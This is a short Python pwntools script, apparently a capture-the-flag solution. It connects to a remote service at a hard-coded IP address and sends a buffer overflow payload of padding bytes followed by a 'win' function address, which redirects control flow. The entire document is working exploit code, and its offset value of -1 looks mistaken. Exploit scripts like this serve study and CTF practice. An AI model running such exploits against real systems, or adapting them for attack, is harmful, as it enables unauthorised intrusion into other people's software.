from pwn import *

def exploit_binary():
    conn = remote('3.110.66.92', 30553) 

    offset = -1
    win_address = 0x40187c

    payload = b'\x90' * (40 - offset) + p64(win_address)
    print(payload)
    conn.recvline()
    conn.sendline(payload)

    print(conn.recvall().decode())

if __name__ == "__main__":
    exploit_binary()
